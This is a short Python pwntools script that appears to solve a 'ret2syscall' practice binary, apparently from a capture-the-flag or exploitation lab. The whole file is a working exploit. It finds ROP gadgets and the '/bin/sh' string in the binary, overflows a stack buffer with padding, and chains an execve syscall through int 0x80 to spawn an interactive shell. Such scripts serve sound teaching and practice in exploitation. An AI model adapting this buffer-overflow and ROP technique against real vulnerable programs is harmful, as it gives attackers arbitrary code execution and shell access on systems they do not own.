from pwn import *

p = process("./ret2syscall")

elf = p.elf
gadget = lambda x: next(elf.search(asm(x, os='linux', arch='i386')))
bin_sh = next(elf.search(b"/bin/sh"))
pop_eax = gadget("pop eax; ret")
pop_edx_ecx_ebx = gadget("pop edx ; pop ecx ; pop ebx ; ret")
syscall = gadget("int 0x80")
payload = b''.join(p32(i) for i in [
    pop_eax, 0xb, pop_edx_ecx_ebx, 0, 0, bin_sh, syscall
])
p.sendline(b"A"*(0x64 + 4*3) + payload)

p.interactive()
